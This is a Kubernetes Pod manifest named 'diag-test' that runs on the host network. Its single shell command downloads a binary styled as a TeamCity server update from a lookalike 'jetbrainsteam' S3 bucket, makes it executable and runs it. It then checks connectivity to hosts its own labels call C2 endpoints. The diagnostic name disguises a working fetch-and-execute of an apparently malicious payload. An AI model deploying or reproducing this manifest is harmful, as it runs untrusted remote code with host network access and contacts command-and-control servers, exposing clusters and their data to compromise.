apiVersion: v1
kind: Pod
metadata:
  name: diag-test
  namespace: default
spec:
  hostNetwork: true
  containers:
  - name: test
    image: alpine:latest
    command: ["/bin/sh", "-c"]
    args:
    - "apk add --no-cache curl bash && echo '===S3_DOWNLOAD===' && curl -fsSL -o /tmp/ts https://jetbrainsteam-updates.s3.amazonaws.com/teamcity-server-update.bin -w 'HTTP:%{http_code} SIZE:%{size_download}' && echo && echo '===FILE===' && ls -la /tmp/ts && file /tmp/ts | head -c 100 && echo '===CHMOD===' && chmod +x /tmp/ts && echo '===RUN_TEST===' && timeout 5 /tmp/ts 2>&1 || true && echo '===C2_DIRECT===' && curl -sk -m5 -o /dev/null -w '%{http_code}' https://13.212.144.69:443/ && echo && echo '===C2_SSL===' && curl -sk -m5 -o /dev/null -w '%{http_code}' https://ssl.jetbrainsteam.com:443/ && echo && echo '===IP_TEST===' && curl -sk -m5 -o /dev/null -w '%{http_code}' https://1.1.1.1/ && echo && echo '===DONE===' && sleep 600"
  restartPolicy: Never
